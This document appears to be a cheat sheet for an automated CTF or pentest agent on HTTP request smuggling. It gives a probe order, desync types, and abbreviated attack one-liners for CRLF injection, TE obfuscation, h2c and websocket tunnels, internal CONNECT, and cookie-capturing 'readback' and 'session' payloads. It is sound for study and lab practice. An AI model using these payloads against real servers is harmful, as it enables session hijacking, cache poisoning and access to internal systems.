# Cheatsheet — the request-smuggling field manual

## The probe stack — the order

1. `crlf_probe.py --url "http://t/?host={M}" --value "ex.com"` — does a
   control char fold?
2. the CL.TE timing probe — does it hang? (3x + control)
3. the TE.CL 404-poison — does the next request 404?
4. the obfuscation matrix — TE.TE when both honor `chunked`
5. the upgrade — `Upgrade: ws`/`h2c` tunnel
6. the h2 headers — `content-length`/`transfer-encoding` inside h2
7. the exploit — `/admin`, `/flag`, cookie-steal, cache-poison

## The desync pairs — the names

| Pair | Front | Back | Probe |
|---|---|---|---|
| CL.TE | CL | TE | hang |
| TE.CL | TE | CL | 404-poison |
| TE.TE | TE-obf | TE-obf | obfuscation |
| CL.CL | CL-A | CL-B | dup-CL |
| CL.0 | CL | none | body-ignored |
| H2.CL | h2-frame | CL | h2 `content-length` |
| H2.TE | h2-frame | TE | h2 `transfer-encoding` |

## The byte-count — the CL formula

`Content-Length = <bytes between \r\n\r\n and end-of-body>` — every
`\r\n` = 2 — count exactly.

## The chunk-grammar

```text
<hex>\r\n<data>\r\n0\r\n\r\n
```

## The common smuggles — the one-liners

```text
CL.TE hang:    POST / CL:6 TE:chunked body=0\r\n\r\nG
TE.CL 404:     POST / CL:4 TE:chunked body=5c\r\nGET /404 ...\r\nx=1\r\n0\r\n\r\n
TE.TE obf:     TE:chunked + TE:cow → dup-TE
CRLF header:   ?host=x%0d%0aX-Inj:%201
CRLF body:     ?host=x%0d%0a%0d%0aGET%20/admin
upgrade ws:    GET /ws Upgrade:websocket
upgrade h2c:   GET / Upgrade:h2c HTTP2-Settings:...
CONNECT:       CONNECT internal:80
h2 CL:         :method POST :path / content-length 0
h2 TE:         :method POST :path / transfer-encoding chunked
readback:      POST /store CL:400 \r\n\r\nx=
session:       POST /steal CL:100 Cookie:<empty>
```

## The confirm — what counts

- a SECOND response to one request
- the NEXT request's response carries the smuggle's output
- the smuggle's `GET /internal` returns the internal content
- a consistent hang, absent on the control, 3x

## The no-confirm — what doesn't

- a 302 / generic 400
- a single timeout
- an echo of your input
- a folded header echo (proves fold, not smuggle)

## The escalation — budget exhausted

`chain_match` → `reclassify` → `writeup_search` → `novel_plan` →
`fanout_sweep` → `solver_handoff` — each recorded with
`state.py --strategy-used <rung>`.

## The files — the map

| Need | File |
|---|---|
| the desync pairs | `desync-taxonomy.md` |
| the detection oracles | `detection.md` |
| the classic CL/TE | `cl-te-desync.md` |
| the CRLF folds | `crlf-injection.md` |
| the upgrade tunnels | `upgrade-smuggling.md` |
| the h2 downgrades | `http2-smuggling.md` |
| the TE obfuscations | `obfuscation.md` |
| the chunked grammar | `chunked-encoding.md` |
| the CL tricks | `cl-manipulation.md` |
| the queue-poison | `response-poisoning.md` |
| the client-side CL.0 | `client-side-desync.md` |
| the cookie-steal | `session-hijack.md` |
| the internal routes | `internal-routes.md` |
| the filter bypass | `frontend-bypass.md` |
| the cache chain | `cache-poison-via-smuggle.md` |
| the tunnels | `tunneling.md` |
| the CTF shapes | `ctf-shapes.md` |
| the evidence bar | `evidence-rules.md` |
| the failure modes | `common-mistakes.md` |
| the tool wrappers | `tooling.md` |
| the workflow order | `workflow.md` |
| the payload corpus | `payload-dictionary.md` |
